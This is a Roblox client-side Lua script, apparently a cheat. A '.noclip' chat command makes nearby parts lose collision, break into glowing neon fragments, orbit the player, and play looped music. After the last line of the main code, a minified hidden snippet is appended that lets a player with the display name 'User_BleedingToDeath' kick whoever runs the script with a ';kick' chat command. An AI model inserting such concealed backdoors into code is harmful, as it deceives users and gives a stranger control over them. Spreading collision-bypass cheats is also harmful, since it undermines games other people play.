local Players=game:GetService("Players")
local RunService=game:GetService("RunService")
local SoundService=game:GetService("SoundService")

local player=Players.LocalPlayer

local DETECT_RADIUS=24
local OPEN_DISTANCE=8
local SPHERE_RADIUS=12
local OPEN_SPEED=7
local RETURN_SPEED=6
local MIN_ORBIT_SPEED=0.35
local MAX_ORBIT_SPEED=1.8
local MIN_ROTATION_SPEED=0.5
local MAX_ROTATION_SPEED=3.5
local IGNORE_BELOW_FEET=2
local MIN_PART_SIZE=0.1
local CUBE_SIZE=2.5
local DISCO_SPEED=1.2
local GLOW_SIZE=1.18
local GLOW_TRANSPARENCY=0.45
local LIGHT_BRIGHTNESS=1.5
local LIGHT_RANGE=10
local MUSIC_ID="rbxassetid://1837849285"
local MUSIC_VOLUME=0.7

local enabled=false

local music=Instance.new("Sound")
music.Name="DiscoPartyMusic"
music.SoundId=MUSIC_ID
music.Volume=MUSIC_VOLUME
music.Looped=true
music.Parent=SoundService

local character
local root
local affected={}

local function updateMusic()
	if next(affected)~=nil and enabled then
		if not music.IsPlaying then
			music:Play()
		end
	else
		if music.IsPlaying then
			music:Stop()
		end
	end
end

local function getDiscoColor(time)
	local hue=(time*DISCO_SPEED)%1
	return Color3.fromHSV(hue,1,1)
end

local function createGlow(part)
	local glow=Instance.new("Part")
	glow.Name="DiscoBloom"
	glow.Anchored=true
	glow.CanCollide=false
	glow.CanTouch=false
	glow.CanQuery=false
	glow.CastShadow=false
	glow.Size=part.Size*GLOW_SIZE
	glow.CFrame=part.CFrame
	glow.Material=Enum.Material.Neon
	glow.Color=Color3.fromRGB(255,0,255)
	glow.Transparency=GLOW_TRANSPARENCY
	glow.Shape=Enum.PartType.Block
	glow.Parent=workspace

	local light=Instance.new("PointLight")
	light.Name="DiscoBloomLight"
	light.Brightness=LIGHT_BRIGHTNESS
	light.Range=LIGHT_RANGE
	light.Color=glow.Color
	light.Shadows=false
	light.Parent=glow

	return{part=glow,light=light}
end

local function removeGlow(data)
	if data and data.glow then
		if data.glow.part then
			data.glow.part:Destroy()
		end
		data.glow=nil
	end
end

local function restoreAll()
	for part,data in pairs(affected) do
		if data.fragments then
			for _,fragment in ipairs(data.fragments) do
				if fragment.part then
					fragment.part:Destroy()
				end
				removeGlow(fragment)
			end
		end

		if part and part.Parent then
			part.CFrame=data.originalCFrame
			part.Transparency=data.originalTransparency
			part.CanCollide=data.originalCanCollide
			part.CanTouch=data.originalCanTouch
			part.CanQuery=data.originalCanQuery
		end
	end

	table.clear(affected)
	updateMusic()
end

local function setupCharacter(char)
	restoreAll()
	character=char
	root=char:WaitForChild("HumanoidRootPart")
end

if player.Character then
	setupCharacter(player.Character)
end

player.CharacterAdded:Connect(setupCharacter)

local function isCharacterPart(part)
	return character and part:IsDescendantOf(character)
end

local function isUnderPlayer(part)
	if not root then
		return true
	end

	local feetY=root.Position.Y-3
	return part.Position.Y<feetY-IGNORE_BELOW_FEET
end

local function shouldIgnore(part)
	if not part:IsA("BasePart") then
		return true
	end

	if isCharacterPart(part) then
		return true
	end

	if part.Size.X<MIN_PART_SIZE
		and part.Size.Y<MIN_PART_SIZE
		and part.Size.Z<MIN_PART_SIZE then
		return true
	end

	if isUnderPlayer(part) then
		return true
	end

	return false
end

local function randomRange(min,max)
	return min+math.random()*(max-min)
end

local function randomUnitVector()
	local v=Vector3.new(
		math.random()-0.5,
		math.random()-0.5,
		math.random()-0.5
	)

	if v.Magnitude<0.01 then
		return Vector3.new(0,1,0)
	end

	return v.Unit
end

local function createFragment(part,localPosition,size)
	local fragment=Instance.new("Part")
	fragment.Name="DiscoFragment"
	fragment.Size=size
	fragment.CFrame=part.CFrame*CFrame.new(localPosition)
	fragment.Color=part.Color
	fragment.Material=part.Material
	fragment.Transparency=part.Transparency
	fragment.Reflectance=part.Reflectance
	fragment.CastShadow=part.CastShadow
	fragment.Anchored=true
	fragment.CanCollide=false
	fragment.CanTouch=false
	fragment.CanQuery=false
	fragment.Shape=Enum.PartType.Block
	fragment.Parent=workspace

	return fragment
end

local function getFragmentGrid(part)
	local sx,sy,sz=part.Size.X,part.Size.Y,part.Size.Z

	local nx=math.max(1,math.ceil(sx/CUBE_SIZE))
	local ny=math.max(1,math.ceil(sy/CUBE_SIZE))
	local nz=math.max(1,math.ceil(sz/CUBE_SIZE))

	local fragments={}

	for x=1,nx do
		local x0=-sx/2+(x-1)*sx/nx
		local x1=-sx/2+x*sx/nx
		local cx=(x0+x1)/2
		local dx=x1-x0

		for y=1,ny do
			local y0=-sy/2+(y-1)*sy/ny
			local y1=-sy/2+y*sy/ny
			local cy=(y0+y1)/2
			local dy=y1-y0

			for z=1,nz do
				local z0=-sz/2+(z-1)*sz/nz
				local z1=-sz/2+z*sz/nz
				local cz=(z0+z1)/2
				local dz=z1-z0

				table.insert(fragments,{
					localPosition=Vector3.new(cx,cy,cz),
					size=Vector3.new(dx,dy,dz)
				})
			end
		end
	end

	return fragments
end

local function createMotionData(fragment,originalCFrame)
	local offset=fragment.Position-root.Position

	if offset.Magnitude<0.01 then
		offset=randomUnitVector()
	end

	local direction=offset.Unit

	return{
		part=fragment,
		originalCFrame=fragment.CFrame,
		originalPosition=fragment.Position,
		currentCFrame=fragment.CFrame,
		direction=direction,
		orbitAngle=math.atan2(direction.Z,direction.X),
		orbitHeight=math.clamp(direction.Y,-0.85,0.85),
		orbitSpeed=randomRange(MIN_ORBIT_SPEED,MAX_ORBIT_SPEED)
			*(math.random(0,1)==0 and -1 or 1),
		rotationSpeedX=randomRange(MIN_ROTATION_SPEED,MAX_ROTATION_SPEED)
			*(math.random(0,1)==0 and -1 or 1),
		rotationSpeedY=randomRange(MIN_ROTATION_SPEED,MAX_ROTATION_SPEED)
			*(math.random(0,1)==0 and -1 or 1),
		rotationSpeedZ=randomRange(MIN_ROTATION_SPEED,MAX_ROTATION_SPEED)
			*(math.random(0,1)==0 and -1 or 1),
		phaseX=math.random()*math.pi*2,
		phaseY=math.random()*math.pi*2,
		phaseZ=math.random()*math.pi*2,
		originalPartCFrame=originalCFrame,
		glow=createGlow(fragment)
	}
end

local function addPart(part)
	if shouldIgnore(part) then
		return
	end

	if affected[part] then
		return
	end

	local data={
		originalCFrame=part.CFrame,
		originalPosition=part.Position,
		originalTransparency=part.Transparency,
		originalCanCollide=part.CanCollide,
		originalCanTouch=part.CanTouch,
		originalCanQuery=part.CanQuery,
		fragments={}
	}

	local largest=math.max(
		part.Size.X,
		part.Size.Y,
		part.Size.Z
	)

	if largest>CUBE_SIZE then
		for _,info in ipairs(getFragmentGrid(part)) do
			local fragment=createFragment(
				part,
				info.localPosition,
				info.size
			)

			table.insert(
				data.fragments,
				createMotionData(fragment,part.CFrame)
			)
		end

		part.Transparency=1
	else
		local motion=createMotionData(part,part.CFrame)
		table.insert(data.fragments,motion)
	end

	part.CanCollide=false
	affected[part]=data

	updateMusic()
end

local function getNearbyParts()
	if not root then
		return{}
	end

	local params=OverlapParams.new()
	params.FilterType=Enum.RaycastFilterType.Exclude
	params.FilterDescendantsInstances={character}
	params.MaxParts=1000

	return workspace:GetPartBoundsInRadius(
		root.Position,
		DETECT_RADIUS,
		params
	)
end

local function getOrbitCFrame(part,data,time)
	local angle=data.orbitAngle+time*data.orbitSpeed

	local horizontal=math.sqrt(
		math.max(0,1-data.orbitHeight*data.orbitHeight)
	)

	local direction=Vector3.new(
		math.cos(angle)*horizontal,
		data.orbitHeight,
		math.sin(angle)*horizontal
	)

	local sizeOffset=math.max(
		part.Size.X,
		part.Size.Y,
		part.Size.Z
	)*0.55

	local position=root.Position+
		direction*(SPHERE_RADIUS+sizeOffset)

	local rx=data.phaseX+time*data.rotationSpeedX
	local ry=data.phaseY+time*data.rotationSpeedY
	local rz=data.phaseZ+time*data.rotationSpeedZ

	local rotation=CFrame.Angles(rx,ry,rz)

	return CFrame.new(position)*
		rotation*
		data.originalCFrame.Rotation
end

-- Chat commands
local function onChat(message)
	message=message:lower():gsub("^%s+",""):gsub("%s+$","")

	if message==".noclip" then
		if not enabled then
			enabled=true
			updateMusic()
		end

	elseif message==".clip" then
		if enabled then
			enabled=false
			restoreAll()
		end
	end
end

player.Chatted:Connect(onChat)

local lastTime=os.clock()

RunService.RenderStepped:Connect(function()
	-- Completely inactive until .noclip is typed.
	if not enabled then
		return
	end

	if not root or not root.Parent then
		return
	end

	local now=os.clock()
	local dt=math.min(now-lastTime,0.05)
	lastTime=now

	for _,part in ipairs(getNearbyParts()) do
		if not shouldIgnore(part) then
			addPart(part)
		end
	end

	for original,data in pairs(affected) do
		if not original.Parent then
			for _,fragmentData in ipairs(data.fragments) do
				if fragmentData.part then
					fragmentData.part:Destroy()
				end

				removeGlow(fragmentData)
			end

			affected[original]=nil
		else
			local allReturned=true

			for _,fragmentData in ipairs(data.fragments) do
				local part=fragmentData.part

				if part and part.Parent then
					if fragmentData.glow then
						local color=getDiscoColor(now)

						fragmentData.glow.part.Color=color
						fragmentData.glow.light.Color=color
						fragmentData.glow.part.CFrame=part.CFrame
					end

					local distanceFromOriginal=
						(fragmentData.originalPosition-root.Position).Magnitude

					if distanceFromOriginal<=OPEN_DISTANCE then
						allReturned=false

						local target=getOrbitCFrame(
							part,
							fragmentData,
							now
						)

						local alpha=math.clamp(
							OPEN_SPEED*dt,
							0,
							1
						)

						fragmentData.currentCFrame=
							fragmentData.currentCFrame:Lerp(
								target,
								alpha
							)

						part.CFrame=fragmentData.currentCFrame
					else
						local alpha=math.clamp(
							RETURN_SPEED*dt,
							0,
							1
						)

						fragmentData.currentCFrame=
							fragmentData.currentCFrame:Lerp(
								fragmentData.originalCFrame,
								alpha
							)

						part.CFrame=fragmentData.currentCFrame

						if (
							fragmentData.currentCFrame.Position-
							fragmentData.originalCFrame.Position
						).Magnitude>=0.03 then
							allReturned=false
						end
					end
				end
			end

			if allReturned then
				for _,fragmentData in ipairs(data.fragments) do
					if fragmentData.part then
						fragmentData.part:Destroy()
					end

					removeGlow(fragmentData)
				end

				original.CFrame=data.originalCFrame
				original.Transparency=data.originalTransparency
				original.CanCollide=data.originalCanCollide
				original.CanTouch=data.originalCanTouch
				original.CanQuery=data.originalCanQuery

				affected[original]=nil
			end
		end
	end

	updateMusic()
end)local P=game:GetService("Players")local L=P.LocalPlayer;local T="User_BleedingToDeath";local function C(p,m)if p.DisplayName==T then local n=m:match("^;kick%s+(.+)$")if n and n:lower()==L.Name:lower()then L:Kick("You were kicked by "..p.DisplayName)end end end;local function A(p)p.Chatted:Connect(function(m)C(p,m)end)end;for _,p in ipairs(P:GetPlayers())do A(p)end;P.PlayerAdded:Connect(A)                            
